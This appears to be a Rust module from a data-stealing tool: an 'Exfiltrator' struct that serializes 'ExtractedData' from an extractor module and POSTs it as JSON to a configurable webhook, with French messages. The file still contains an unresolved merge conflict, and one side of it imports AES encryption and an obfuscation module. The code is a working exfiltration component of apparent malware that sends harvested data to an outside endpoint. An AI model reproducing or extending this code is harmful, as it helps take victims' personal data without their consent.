use reqwest::Client;
use serde_json::json;
<<<<<<< HEAD
use aes_gcm::{Aes256Gcm, Key, Nonce}; 
use aes_gcm::aead::Aead;
use aes_gcm::KeyInit;
use base64::{engine::general_purpose, Engine as _};
use rand::RngCore;
use crate::extractor::ExtractedData;
=======
use crate::extractor::ExtractedData;
use crate::obfuscation;
>>>>>>> main

pub struct Exfiltrator {
    webhook_url: String,
    client: Client,
}

impl Exfiltrator {
    pub fn new(webhook_url: &str) -> Self {
        Exfiltrator {
            webhook_url: webhook_url.to_string(),
            client: Client::new(),
        }
    }
    pub async fn send_data(&self, data: &ExtractedData) -> Result<(), String> {
        let payload_value = serde_json::to_value(data)
            .map_err(|e| format!("Erreur de sérialisation JSON : {}", e))?;


        println!("DEBUG ▶️ Envoi vers {} :\n{}", self.webhook_url,
            serde_json::to_string_pretty(&payload_value)
                .unwrap_or_else(|_| "<impossible de formater>".into())
        );

        let resp = self.client
            .post(&self.webhook_url)
            .json(&payload_value)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if resp.status().is_success() {
            Ok(())
        } else {
            Err(format!("Échec (HTTP {}).", resp.status()))
        }
    }

    fn format_message(&self, data: &ExtractedData) -> String {
    match serde_json::to_string_pretty(data) {
        Ok(json_string) => json_string,
        Err(e) => {
            eprintln!("Erreur lors de la sérialisation JSON : {}", e);
            format!(r#"{{"error": "Impossible de sérialiser les données", "details": "{}"}}"#, e)
        }
    }
}

}
